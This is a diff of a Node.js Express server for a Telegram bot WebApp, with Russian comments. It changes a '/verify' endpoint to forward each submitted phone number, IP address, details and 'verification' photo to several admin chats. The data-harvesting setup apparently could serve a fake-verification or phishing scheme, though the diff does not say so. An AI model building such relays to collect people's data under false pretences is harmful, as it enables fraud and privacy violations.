@@ -8,14 +8,19 @@ const fs = require('fs');
 const app = express();
 const upload = multer();
 
-// Данные из переменных окружения
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
-
 app.use(express.json());
 app.use(express.static('public'));
 
-// 1. Функция приветствия (отправляет локальное фото yap.png)
+// --- НАСТРОЙКИ ---
+const BOT_TOKEN = process.env.BOT_TOKEN;
+
+// Получаем список админов. В Render в переменной CHAT_ID пиши: 123456,789012
+const ADMIN_IDS = (process.env.CHAT_ID || '')
+    .split(',')
+    .map(id => id.trim())
+    .filter(id => id); // Убирает пустые значения
+
+// --- 1. ПРИВЕТСТВИЕ (ЛОКАЛЬНОЕ ФОТО) ---
 async function sendWelcome(userChatId, req) {
     const photoPath = path.join(__dirname, 'yap.png');
     const webAppUrl = `https://${req.get('host')}`; 
@@ -29,7 +34,7 @@ async function sendWelcome(userChatId, req) {
 
     try {
         const form = new FormData();
-        form.append('chat_id', userChatId); // Шлем ТОМУ, кто нажал старт
+        form.append('chat_id', userChatId);
         form.append('photo', fs.createReadStream(photoPath));
         form.append('caption', captionText);
         form.append('parse_mode', 'Markdown');
@@ -43,11 +48,11 @@ async function sendWelcome(userChatId, req) {
             headers: form.getHeaders()
         });
     } catch (e) {
-        console.error("Ошибка в sendWelcome:", e.message);
+        console.error("Ошибка приветствия:", e.message);
     }
 }
 
-// 2. Обработчик команды /start от Telegram
+// --- 2. ОБРАБОТЧИК /start ---
 app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
     const { message } = req.body;
     if (message && message.text === '/start') {
@@ -56,12 +61,12 @@ app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
     res.sendStatus(200);
 });
 
-// 3. Главная страница (WebApp)
+// --- 3. ГЛАВНАЯ СТРАНИЦА ---
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// 4. Прием данных из формы (отправка заявки ТЕБЕ)
+// --- 4. ПРИЕМ ЗАЯВОК (РАССЫЛКА ВСЕМ АДМИНАМ) ---
 app.post('/verify', upload.single('photo'), async (req, res) => {
     try {
         const { phone, ip, details } = req.body;
@@ -76,29 +81,40 @@ app.post('/verify', upload.single('photo'), async (req, res) => {
 ${details || 'Нет данных'}
         `;
 
-        if (photo) {
-            const form = new FormData();
-            form.append('chat_id', CHAT_ID); // Шлем ТЕБЕ (админу)
-            form.append('caption', caption);
-            form.append('parse_mode', 'Markdown');
-            form.append('photo', photo.buffer, { filename: 'verification.jpg' });
+        // Проходим циклом по всем админам
+        for (const adminId of ADMIN_IDS) {
+            try {
+                if (photo) {
+                    // Создаем новую форму для каждого админа (обязательно!)
+                    const form = new FormData();
+                    form.append('chat_id', adminId);
+                    form.append('caption', caption);
+                    form.append('parse_mode', 'Markdown');
+                    form.append('photo', photo.buffer, { filename: 'verification.jpg' });
 
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
-                headers: form.getHeaders()
-            });
-        } else {
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: caption,
-                parse_mode: 'Markdown'
-            });
+                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
+                        headers: form.getHeaders()
+                    });
+                } else {
+                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        chat_id: adminId,
+                        text: caption,
+                        parse_mode: 'Markdown'
+                    });
+                }
+                console.log(`Заявка отправлена админу: ${adminId}`);
+            } catch (innerError) {
+                console.error(`Не удалось отправить админу ${adminId}:`, innerError.message);
+                // Не прерываем цикл, пробуем отправить следующему
+            }
         }
+
         res.sendStatus(200);
     } catch (error) {
-        console.error('Ошибка в /verify:', error.message);
+        console.error('Общая ошибка /verify:', error.message);
         res.sendStatus(500);
     }
 });
 
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
+app.listen(PORT, () => console.log(`Сервер запущен. Порт: ${PORT}. Админов: ${ADMIN_IDS.length}`));
